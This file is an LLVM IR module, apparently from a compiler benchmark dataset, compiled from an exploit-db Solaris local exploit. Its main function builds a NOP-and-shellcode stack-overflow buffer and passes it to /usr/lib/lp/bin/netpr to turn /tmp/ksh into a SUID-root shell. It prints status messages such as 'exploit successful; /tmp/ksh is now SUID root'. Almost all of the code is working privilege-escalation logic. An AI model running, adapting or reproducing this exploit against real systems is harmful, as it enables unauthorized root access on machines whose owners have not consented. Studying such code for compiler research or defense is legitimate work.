; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19911.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19911.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i64, i32 }

@.str = private unnamed_addr constant [29 x i8] c"usage: %s hostname [offset]\0A\00", align 1
@buf = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@BUFLEN = common dso_local global i32 0, align 4
@shell = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [57 x i8] c"using return address 0x%08x (0x%08x offset %d) [nop %d]\0A\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"/tmp/ksh\00", align 1
@.str.3 = private unnamed_addr constant [46 x i8] c"exploit failed; copy /bin/ksh to /tmp first!\0A\00", align 1
@.str.4 = private unnamed_addr constant [42 x i8] c"exploit failed; unable to create a pipe!\0A\00", align 1
@.str.5 = private unnamed_addr constant [33 x i8] c"exploit failed; unable to fork!\0A\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"/dev/null\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [40 x i8] c"exploit failed; cannot open /dev/null!\0A\00", align 1
@STDIN_FILENO = common dso_local global i32 0, align 4
@STDOUT_FILENO = common dso_local global i32 0, align 4
@STDERR_FILENO = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [22 x i8] c"/usr/lib/lp/bin/netpr\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"netpr\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"-I\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"ADM-ADM\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"-U\00", align 1
@.str.13 = private unnamed_addr constant [8 x i8] c"ADM!ADM\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"-p\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"-d\00", align 1
@.str.16 = private unnamed_addr constant [3 x i8] c"-P\00", align 1
@.str.17 = private unnamed_addr constant [4 x i8] c"bsd\00", align 1
@.str.18 = private unnamed_addr constant [12 x i8] c"/etc/passwd\00", align 1
@.str.19 = private unnamed_addr constant [33 x i8] c"exploit failed; unable to exec!\0A\00", align 1
@.str.20 = private unnamed_addr constant [76 x i8] c"exploit failed; child process died on signal %d (try adjusting the offset)\0A\00", align 1
@.str.21 = private unnamed_addr constant [84 x i8] c"exploit failed; child process exited with unexpected return value %d, instead of 0\0A\00", align 1
@.str.22 = private unnamed_addr constant [47 x i8] c"exploit failed; /tmp/ksh disappeared somehow!\0A\00", align 1
@.str.23 = private unnamed_addr constant [56 x i8] c"exploit failed; failed to make /tmp/ksh owned by root!\0A\00", align 1
@.str.24 = private unnamed_addr constant [57 x i8] c"exploit failed; failed to change /tmp/ksh to mode 4555!\0A\00", align 1
@.str.25 = private unnamed_addr constant [54 x i8] c"exploit successful; /tmp/ksh is now SUID root, dewd!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [2 x i32], align 4
  %14 = alloca %struct.stat, align 8
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 0, i64* %8, align 8
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %16, 2
  br i1 %17, label %18, label %24

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 1) #3
  unreachable

24:                                               ; preds = %2
  %25 = call i64 (...) @get_esp()
  store i64 %25, i64* %6, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  store i8* %28, i8** %9, align 8
  %29 = load i32, i32* %4, align 4
  %30 = icmp sgt i32 %29, 2
  br i1 %30, label %31, label %36

31:                                               ; preds = %24
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @strtol(i8* %34, i32* null, i32 0)
  store i64 %35, i64* %8, align 8
  br label %36

36:                                               ; preds = %31, %24
  %37 = load i32, i32* %4, align 4
  %38 = icmp sgt i32 %37, 3
  br i1 %38, label %39, label %44

39:                                               ; preds = %36
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 3
  %42 = load i8*, i8** %41, align 8
  %43 = call i64 @strtoul(i8* %42, i32* null, i32 0)
  store i64 %43, i64* %7, align 8
  br label %45

44:                                               ; preds = %36
  store i64 942, i64* %7, align 8
  br label %45

45:                                               ; preds = %44, %39
  %46 = load i32*, i32** @buf, align 8
  %47 = load i32, i32* @NOP, align 4
  %48 = load i32, i32* @BUFLEN, align 4
  %49 = call i32 @memset(i32* %46, i32 %47, i32 %48)
  %50 = load i32*, i32** @buf, align 8
  %51 = load i64, i64* %7, align 8
  %52 = getelementptr inbounds i32, i32* %50, i64 %51
  %53 = load i32, i32* @shell, align 4
  %54 = load i32, i32* @shell, align 4
  %55 = call i64 @strlen(i32 %54)
  %56 = call i32 @memcpy(i32* %52, i32 %53, i64 %55)
  %57 = load i64, i64* %7, align 8
  %58 = load i32, i32* @shell, align 4
  %59 = call i64 @strlen(i32 %58)
  %60 = add i64 %57, %59
  %61 = trunc i64 %60 to i32
  store i32 %61, i32* %11, align 4
  br label %62

62:                                               ; preds = %76, %45
  %63 = load i32, i32* %11, align 4
  %64 = load i32, i32* @BUFLEN, align 4
  %65 = sub nsw i32 %64, 4
  %66 = icmp sle i32 %63, %65
  br i1 %66, label %67, label %79

67:                                               ; preds = %62
  %68 = load i64, i64* %6, align 8
  %69 = load i64, i64* %8, align 8
  %70 = add i64 %68, %69
  %71 = trunc i64 %70 to i32
  %72 = load i32*, i32** @buf, align 8
  %73 = load i32, i32* %11, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i32, i32* %72, i64 %74
  store i32 %71, i32* %75, align 4
  br label %76

76:                                               ; preds = %67
  %77 = load i32, i32* %11, align 4
  %78 = add nsw i32 %77, 4
  store i32 %78, i32* %11, align 4
  br label %62

79:                                               ; preds = %62
  %80 = load i64, i64* %6, align 8
  %81 = load i64, i64* %8, align 8
  %82 = add i64 %80, %81
  %83 = load i64, i64* %6, align 8
  %84 = load i64, i64* %8, align 8
  %85 = load i64, i64* %7, align 8
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.1, i64 0, i64 0), i64 %82, i64 %83, i64 %84, i64 %85)
  %87 = call i64 @stat(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), %struct.stat* %14)
  %88 = icmp slt i64 %87, 0
  br i1 %88, label %89, label %92

89:                                               ; preds = %79
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.3, i64 0, i64 0))
  %91 = call i32 @exit(i32 1) #3
  unreachable

92:                                               ; preds = %79
  %93 = getelementptr inbounds [2 x i32], [2 x i32]* %13, i64 0, i64 0
  %94 = call i64 @pipe(i32* %93)
  %95 = icmp slt i64 %94, 0
  br i1 %95, label %96, label %99

96:                                               ; preds = %92
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.4, i64 0, i64 0))
  %98 = call i32 @exit(i32 1) #3
  unreachable

99:                                               ; preds = %92
  %100 = call i32 (...) @fork()
  switch i32 %100, label %139 [
    i32 -1, label %101
    i32 0, label %104
  ]

101:                                              ; preds = %99
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.5, i64 0, i64 0))
  %103 = call i32 @exit(i32 1) #3
  unreachable

104:                                              ; preds = %99
  %105 = load i32, i32* @O_RDWR, align 4
  %106 = call i32 @open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0), i32 %105, i32 0)
  store i32 %106, i32* %12, align 4
  %107 = icmp slt i32 %106, 0
  br i1 %107, label %108, label %111

108:                                              ; preds = %104
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.7, i64 0, i64 0))
  %110 = call i32 @exit(i32 1) #3
  unreachable

111:                                              ; preds = %104
  %112 = load i32, i32* %12, align 4
  %113 = load i32, i32* @STDIN_FILENO, align 4
  %114 = call i32 @dup2(i32 %112, i32 %113)
  %115 = load i32, i32* %12, align 4
  %116 = load i32, i32* @STDOUT_FILENO, align 4
  %117 = call i32 @dup2(i32 %115, i32 %116)
  %118 = load i32, i32* %12, align 4
  %119 = load i32, i32* @STDERR_FILENO, align 4
  %120 = call i32 @dup2(i32 %118, i32 %119)
  %121 = load i32, i32* %12, align 4
  %122 = load i32, i32* @STDERR_FILENO, align 4
  %123 = icmp sgt i32 %121, %122
  br i1 %123, label %124, label %127

124:                                              ; preds = %111
  %125 = load i32, i32* %12, align 4
  %126 = call i32 @close(i32 %125)
  br label %127

127:                                              ; preds = %124, %111
  %128 = getelementptr inbounds [2 x i32], [2 x i32]* %13, i64 0, i64 0
  %129 = load i32, i32* %128, align 4
  %130 = call i32 @close(i32 %129)
  %131 = getelementptr inbounds [2 x i32], [2 x i32]* %13, i64 0, i64 1
  %132 = load i32, i32* %131, align 4
  %133 = call i32 @dup2(i32 %132, i32 10)
  %134 = load i32*, i32** @buf, align 8
  %135 = load i8*, i8** %9, align 8
  %136 = call i32 @execl(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i32* %134, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i8* %135, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.16, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.17, i64 0, i64 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.18, i64 0, i64 0), i32* null)
  %137 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.19, i64 0, i64 0))
  %138 = call i32 @exit(i32 1) #3
  unreachable

139:                                              ; preds = %99
  %140 = getelementptr inbounds [2 x i32], [2 x i32]* %13, i64 0, i64 1
  %141 = load i32, i32* %140, align 4
  %142 = call i32 @close(i32 %141)
  store i8 0, i8* %10, align 1
  br label %143

143:                                              ; preds = %147, %139
  %144 = load i8, i8* %10, align 1
  %145 = sext i8 %144 to i32
  %146 = icmp ne i32 %145, 10
  br i1 %146, label %147, label %151

147:                                              ; preds = %143
  %148 = getelementptr inbounds [2 x i32], [2 x i32]* %13, i64 0, i64 0
  %149 = load i32, i32* %148, align 4
  %150 = call i32 @read(i32 %149, i8* %10, i32 1)
  br label %143

151:                                              ; preds = %143
  store i8 0, i8* %10, align 1
  br label %152

152:                                              ; preds = %157, %151
  %153 = getelementptr inbounds [2 x i32], [2 x i32]* %13, i64 0, i64 0
  %154 = load i32, i32* %153, align 4
  %155 = call i32 @write(i32 %154, i8* %10, i32 1)
  %156 = icmp slt i32 %155, 1
  br i1 %156, label %157, label %158

157:                                              ; preds = %152
  br label %152

158:                                              ; preds = %152
  %159 = call i32 @wait(i32* %15)
  %160 = load i32, i32* %15, align 4
  %161 = call i32 @WIFSIGNALED(i32 %160)
  %162 = icmp ne i32 %161, 0
  br i1 %162, label %163, label %168

163:                                              ; preds = %158
  %164 = load i32, i32* %15, align 4
  %165 = call i32 @WTERMSIG(i32 %164)
  %166 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.20, i64 0, i64 0), i32 %165)
  %167 = call i32 @exit(i32 1) #3
  unreachable

168:                                              ; preds = %158
  %169 = load i32, i32* %15, align 4
  %170 = call i32 @WIFEXITED(i32 %169)
  %171 = icmp ne i32 %170, 0
  br i1 %171, label %172, label %181

172:                                              ; preds = %168
  %173 = load i32, i32* %15, align 4
  %174 = call i32 @WEXITSTATUS(i32 %173)
  %175 = icmp ne i32 %174, 0
  br i1 %175, label %176, label %181

176:                                              ; preds = %172
  %177 = load i32, i32* %15, align 4
  %178 = call i32 @WEXITSTATUS(i32 %177)
  %179 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.21, i64 0, i64 0), i32 %178)
  %180 = call i32 @exit(i32 1) #3
  unreachable

181:                                              ; preds = %172, %168
  br label %182

182:                                              ; preds = %181
  br label %183

183:                                              ; preds = %182
  %184 = call i64 @stat(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), %struct.stat* %14)
  %185 = icmp slt i64 %184, 0
  br i1 %185, label %186, label %189

186:                                              ; preds = %183
  %187 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.22, i64 0, i64 0))
  %188 = call i32 @exit(i32 1) #3
  unreachable

189:                                              ; preds = %183
  %190 = getelementptr inbounds %struct.stat, %struct.stat* %14, i32 0, i32 0
  %191 = load i64, i64* %190, align 8
  %192 = icmp ne i64 %191, 0
  br i1 %192, label %193, label %196

193:                                              ; preds = %189
  %194 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.23, i64 0, i64 0))
  %195 = call i32 @exit(i32 1) #3
  unreachable

196:                                              ; preds = %189
  %197 = getelementptr inbounds %struct.stat, %struct.stat* %14, i32 0, i32 1
  %198 = load i32, i32* %197, align 8
  %199 = and i32 %198, 4095
  %200 = icmp ne i32 %199, 2413
  br i1 %200, label %201, label %204

201:                                              ; preds = %196
  %202 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.24, i64 0, i64 0))
  %203 = call i32 @exit(i32 1) #3
  unreachable

204:                                              ; preds = %196
  %205 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.25, i64 0, i64 0))
  %206 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @get_esp(...) #1

declare dso_local i64 @strtol(i8*, i32*, i32) #1

declare dso_local i64 @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @memset(i32*, i32, i32) #1

declare dso_local i32 @memcpy(i32*, i32, i64) #1

declare dso_local i64 @strlen(i32) #1

declare dso_local i64 @stat(i8*, %struct.stat*) #1

declare dso_local i64 @pipe(i32*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @open(i8*, i32, i32) #1

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i8*, i8*, i32*, i8*, i8*, i8*, i8*, i8*, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i32 @WIFSIGNALED(i32) #1

declare dso_local i32 @WTERMSIG(i32) #1

declare dso_local i32 @WIFEXITED(i32) #1

declare dso_local i32 @WEXITSTATUS(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
